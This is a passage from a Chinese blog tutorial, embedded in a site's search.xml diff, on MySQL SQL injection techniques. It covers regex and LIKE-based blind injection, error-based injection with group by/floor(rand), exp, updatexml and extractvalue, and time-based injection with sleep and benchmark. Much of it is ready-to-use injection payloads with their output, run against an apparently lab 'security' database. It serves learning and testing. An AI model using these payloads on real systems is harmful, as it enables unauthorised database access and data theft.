+<td align="left">匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号[ ]表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 \^。</td>
+</tr>
+</tbody></table>
+<p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 +或 ?或 {n}或 {n,} 或 {n,m}共6种。</p>
+<p>正则表达式的限定符有：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
+</tr>
+<tr>
+<td>+</td>
+<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
+</tr>
+<tr>
+<td>？</td>
+<td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
+</tr>
+<tr>
+<td>{n}</td>
+<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
+</tr>
+<tr>
+<td>{n,}</td>
+<td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
+</tr>
+<tr>
+<td>{n,m}</td>
+<td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
+</tr>
+</tbody></table>
+<p>regexp ‘^[a-z]’表示匹配开头为小写字母的字符串</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">//正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内</span><br><span class="line">// 判断第一个表名的第一个字符是否是a-z中的字符,其中security是假设已知的库名。</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[a-z]&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">// 判断第一个表名的第一个字符是否是a-n中的字符</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[a-n]&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line"></span><br><span class="line">// 判断第一个表名的第一个字符是否是f-n中的字符</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[f-n]&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">//确定该字符为<span class="string">&#x27;e&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^e&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br><span class="line">| 1 |</span><br><span class="line">+<span class="comment">---+</span></span><br></pre></td></tr></table></figure>
+
+<p>因此由上面可以得出正则匹配的payload可以为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[a-n]&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>like匹配注入</p>
+<p>常用的匹配符有：%，_，escape</p>
+<p>%     匹配0个或任意多个字符；</p>
+<p>_     匹配任意一个字符；</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">like</span> <span class="string">&#x27;se%&#x27;</span>;</span><br><span class="line">//%放在后面表示匹配开头为se</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| database() like &#x27;se%&#x27; |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">|                     1 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">like</span> <span class="string">&#x27;%se&#x27;</span>;</span><br><span class="line">//%放在前面表示匹配结尾为se</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| database() like &#x27;%se&#x27; |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">|                     0 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">like</span> <span class="string">&#x27;%se%&#x27;</span>;</span><br><span class="line">//%放在前后表示匹配中间为se</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">| database() like &#x27;%se%&#x27; |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">|                      1 |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">like</span> <span class="string">&#x27;se______&#x27;</span>;</span><br><span class="line">//_表示匹配开头为se，剩下的字符用_表示</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| database() like &#x27;se______&#x27; |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">|                          1 |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>基于布尔盲注的payload大概有以下这些：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&#x27; or Length(database()) &lt;8#</span><br><span class="line"></span><br><span class="line">&#x27; or ascii(mid(database(),1,1)) =ascii(&#x27;d&#x27;)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">ord</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="keyword">ascii</span>(<span class="string">&#x27;d&#x27;</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=(select 1 from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; and table_name regexp &#x27;</span>^[a-n]<span class="string">&#x27; limit 0,1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="keyword">select</span>  <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">like</span> <span class="string">&#x27;%se&#x27;</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>等等</p>
+<h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>基于报错的盲注就是构造payload让信息通过错误提示回显出来，主要有group by报错、exp报错、updatexml报错、extractvalue报错</p>
+<p>group by报错</p>
+<p>count()：返回匹配指定条件的行数。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> emails;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| count(*) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        8 |</span><br><span class="line">+<span class="comment">----------+</span></span><br></pre></td></tr></table></figure>
+
+<p>floor()：产生小于或等于指定值（value）的最小整数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">floor</span>(<span class="number">1.9</span>);</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| floor(1.9) |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">|          1 |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">floor</span>(<span class="number">1.1</span>);</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| floor(1.1) |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">|          1 |</span><br><span class="line">+<span class="comment">------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>rand()：随机产生0和1之间的浮点数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">rand</span>(<span class="number">0</span>);</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| rand(0)             |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">rand</span>(<span class="number">1</span>);</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| rand(1)             |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| 0.40540353712197724 |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看一下下面的这条语句，报错显示user为root@localhost</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;::root@localhost::1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>首先，在上面这个语句中，rand()产生的是伪随机数，实际上每次结果出来都是一致的。</p>
+<p>floor()会返回一个小于或等于传入参数的最大整数，相当于把小数部分截取掉。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">+<span class="comment">------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>floor(rand(0)*2)这个表达式会让information_schema.schemata数据表内的每行数据随机产生不同的结果。</p>
+<p>concat()函数是将字符串拼接起来的一个函数，0x3a是冒号的ascii代码。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br><span class="line">+<span class="comment">----------------------------------------------------+</span></span><br><span class="line">| concat(0x3a,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) |</span><br><span class="line">+<span class="comment">----------------------------------------------------+</span></span><br><span class="line">| :root@localhost:<span class="number">0</span>                                  |</span><br><span class="line">+<span class="comment">----------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a;</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">| a                 |</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">| :root@localhost:0 |</span><br><span class="line">+<span class="comment">-------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>group by是进行分组的，group by a指按照a的规则进行分组，这里的a指的就是concat里面的一整串语句，比如concat(0x3a,(select user()),0x3a,floor(rand(0)<em>2))。在进行分组的时候，mysql会建立一张临时表用于分组，在查询到新的键不在临时表中时，就会将其插入表，a为临时表的主键，也就是说这个主键是不能重复的。而我们在对floor(rand(0)\</em>2))对information_schema.schemata会发现，在这个表中数据大于三行时，肯定会发生重复的情况，也就会导致group by报错，为了满足数据大于三行的条件，我们一般选择information_schema.columns这个数据表。这就是group by的报错。</p>
+<p>因此我们的payload可以为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x<span class="comment">--+</span></span><br><span class="line">//(<span class="keyword">select</span> <span class="keyword">database</span>())改成我们想要得到的数据语句即可</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp报错对版本要求太高，一般不会使用</p>
+<p>exp()函数返回e(自然对数的底)的x次方的值，比如exp(2)即返回e的二次方，常量e为一个无穷数，约为2.71828</p>
+<p>当x数字过大的时候，就会造成exp溢出，引起溢出错误。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(<span class="number">709</span>);</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| exp(709)              |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(<span class="number">710</span>);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br><span class="line">//当大于709时，就会引起溢出错误。</span><br></pre></td></tr></table></figure>
+
+<p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0，因此我们可以利用按位取反来造成exp报错。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ~<span class="number">0</span>;</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| ~0                   |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> ~(<span class="keyword">select</span> <span class="keyword">user</span>());</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| ~(<span class="keyword">select</span> <span class="keyword">user</span>())     |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| <span class="number">18446744073709551615</span> |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以利用以下这个语句来注出用户名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br></pre></td></tr></table></figure>
+
+<p>将select user()改成我们想要的语句即可。由于exp报错要求的版本太高，因此一般也不会用到。</p>
+<p>updatexml报错</p>
+<p>updatexml是XPath的语法，其实也可以叫做XPath语法报错</p>
+<p>updatexml(XML_document, XPath_string, new_value);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值</p>
+<p>XPath语法报错的是特殊字符，即遇到特殊字符就会报错，这里我们选择的是0x7e，即~这个字符</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~security~&#x27;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">5</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~secur~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>必要时要使用substr函数进行搭配使用。</p>
+<p>注入的payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>extractvalue报错：跟updatexml一样。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4、时间注入"><a href="#4、时间注入" class="headerlink" title="4、时间注入"></a>4、时间注入</h2><p>延时注入常用的函数有sleep()和benchmark()，以及if函数</p>
+<p>if语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(expr1,expr2,expr3)//expr1结果为true则执行expr2，否则执行expr3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;r&#x27;</span>,<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">| if(substr(user(),1,1)=&#x27;r&#x27;,3,2) |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">|                              3 |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;r&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">2</span>);</span><br><span class="line">+<span class="comment">---------------------------------------+</span></span><br><span class="line">| if(substr(user(),1,1)=&#x27;r&#x27;,sleep(5),2) |</span><br><span class="line">+<span class="comment">---------------------------------------+</span></span><br><span class="line">|                                     0 |</span><br><span class="line">+<span class="comment">---------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sleep()函数：以秒为单位，休眠多少秒后执行。报错情况下则不延时。一般配合if语句及其他函数一起使用。</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(5) %23 //判断注入类型</span><br><span class="line">1&#x27; and <span class="keyword">select</span> <span class="keyword">if</span>((<span class="keyword">ord</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="keyword">ascii</span>(‘a’)),<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>benchmark(count,expr)函数：对expr执行count次</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">5</span>,<span class="keyword">sleep</span>(<span class="number">1</span>));</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| benchmark(5,sleep(1)) |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">|                     0 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>一般也是配合if语句使用。</p>
+<p>总结：盲注在注入的时候是比较费时间的，因为只能以猜测的方式去进行注入，关于盲注的一些总结则在上面已经讲完了，详细的payload我就不讲了，大家根据函数的意思搭配使用就完事了。</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+</search>
